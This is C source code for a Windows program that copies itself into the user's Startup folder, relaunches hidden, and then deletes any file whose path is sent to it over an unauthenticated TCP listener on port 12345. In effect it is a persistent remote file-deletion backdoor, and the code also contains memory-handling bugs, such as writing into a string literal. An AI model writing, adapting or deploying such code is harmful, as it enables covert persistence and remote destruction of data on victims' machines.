#define _CRT_SECURE_NO_WARNINGS
#define UNICODE

#include <stdio.h>
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <shlobj_core.h>

#pragma comment (lib, "Ws2_32.lib")
#define DEFAULT_PORT             "12345"
#define DEFAULT_MESSAGE_LEN      200

#define WINSOCK_API_INIT_ERROR   0xFF
#define GET_ADDR_INFO_ERROR      0xFE
#define SOCKET_INIT_ERROR        0xFD
#define BIND_ERROR               0xFC
#define LISTEN_ERROR             0xFB
#define ACCEPT_ERROR             0xFA

enum run_mode {
    DISABLED,
    ENABLED
};


void add_program_to_autostart() {
    LPWSTR current_path = L"";
    LPWSTR target_path = L"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\server.exe";

    LPWSTR appdata_folder = L"";

    GetModuleFileName(NULL, current_path, MAX_PATH);
    SHGetKnownFolderPath(&FOLDERID_RoamingAppData, KF_FLAG_CREATE, NULL, &appdata_folder);
    unsigned int l = wcslen((const unsigned short *) appdata_folder);
    wcscpy(&appdata_folder[l], target_path);

    if (wcscmp(appdata_folder, current_path) == 0) return;



    CopyFile(current_path, appdata_folder, 0);

    STARTUPINFO startup_info;
    PROCESS_INFORMATION process_info;
    memset(&startup_info, 0, sizeof(STARTUPINFO));
    startup_info.cb = sizeof(STARTUPINFO);
    memset(&process_info, 0, sizeof(PROCESS_INFORMATION));

    BOOL rv = CreateProcess(
            appdata_folder,
            NULL,
            NULL,
            NULL,
            FALSE,
            CREATE_NO_WINDOW,
            NULL,
            NULL,
            &startup_info,
            &process_info
    );


    exit(0);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   PSTR szCmdParam, int iCmdShow) {
//    hide_program();
    add_program_to_autostart();


    WSADATA wsa_data;
    SOCKET listen_socket = INVALID_SOCKET;
    struct addrinfo hints, *result_addr = NULL;
    int result = 0;

    char message[DEFAULT_MESSAGE_LEN] = "Hello from server!";
    char file_name[DEFAULT_MESSAGE_LEN] = "";

    enum run_mode mode = ENABLED;

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    hints.ai_flags = AI_PASSIVE;

    result = WSAStartup(MAKEWORD(1, 1), &wsa_data);
    if (result != 0) {
        fprintf(stderr, "WSAStartup failed with error: %d\n", result);
        return WINSOCK_API_INIT_ERROR;
    }

    result = getaddrinfo(NULL, (PCSTR) DEFAULT_PORT, &hints, &result_addr);
    if (result != 0) {
        fprintf(stderr, "getaddrinfo failed with error: %d\n", result);
        WSACleanup();
        return GET_ADDR_INFO_ERROR;
    }

    listen_socket = socket(result_addr->ai_family, result_addr->ai_socktype, result_addr->ai_protocol);
    if (listen_socket == INVALID_SOCKET) {
        fprintf(stderr, "socket failed with error: %ld\n", WSAGetLastError());
        freeaddrinfo(result_addr);
        WSACleanup();
        return SOCKET_INIT_ERROR;
    }

    result = bind(listen_socket, result_addr->ai_addr, (int) result_addr->ai_addrlen);
    if (result == SOCKET_ERROR) {
        fprintf(stderr, "bind failed with error: %d\n", WSAGetLastError());
        freeaddrinfo(result_addr);
        closesocket(listen_socket);
        WSACleanup();
        return BIND_ERROR;
    }
    freeaddrinfo(result_addr);

    result = listen(listen_socket, SOMAXCONN);
    if (result == SOCKET_ERROR) {
        fprintf(stderr, "listen failed with error: %d\n", WSAGetLastError());
        closesocket(listen_socket);
        WSACleanup();
        return LISTEN_ERROR;
    }

    while (mode) {
        SOCKET client_socket = INVALID_SOCKET;
        client_socket = accept(listen_socket, NULL, NULL);
        if (client_socket == INVALID_SOCKET) {
            fprintf(stderr, "accept failed with error: %d\n", WSAGetLastError());
            closesocket(listen_socket);
            WSACleanup();
            return ACCEPT_ERROR;
        }
//        int connect = send(client_socket, message, sizeof(message), 0);
        int connect = recv(client_socket, message, sizeof(message), 0);

        switch (connect) {
            case SOCKET_ERROR: {
                fprintf(stderr, "Error send - %d", WSAGetLastError());
                break;
            }
            case 0: {
                fprintf(stderr, "Connection closed with error!\n");
                break;
            }
            default: {
                fprintf(stdout, "File to delete: %s\n", message);
                strcpy_s(file_name, DEFAULT_MESSAGE_LEN, message);

                remove(file_name);

                break;
            }
        }
    }
}